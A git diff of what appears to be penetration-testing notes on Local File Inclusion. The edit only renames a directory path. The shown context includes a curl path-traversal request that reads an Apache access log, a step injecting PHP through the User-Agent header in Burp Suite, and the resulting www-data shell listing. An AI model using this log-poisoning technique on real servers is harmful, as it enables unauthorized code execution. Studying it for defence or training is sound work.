@@ -58,7 +58,7 @@ Local File Inclusion (LFI) vulnerabilities allow attackers to include files from
 #### Practical Example
 
 ```bash
-kali@kali:~$ curl http://example.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+kali@kali:~$ curl http://example.com/malek/index.php?page=../../../../../../../../../var/log/apache2/access.log
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ```
 Modify the User Agent in Burp Suite to include a PHP code snippet:
@@ -71,7 +71,7 @@ Send the modified request and include the log file:
 ```
 Output Example
 ```bash
-www-data@fbea640f9802:/var/www/html/meteor$ ls
+www-data@fbea640f9802:/var/www/html/malek$ ls
 admin.php
 bavarian.php
 css
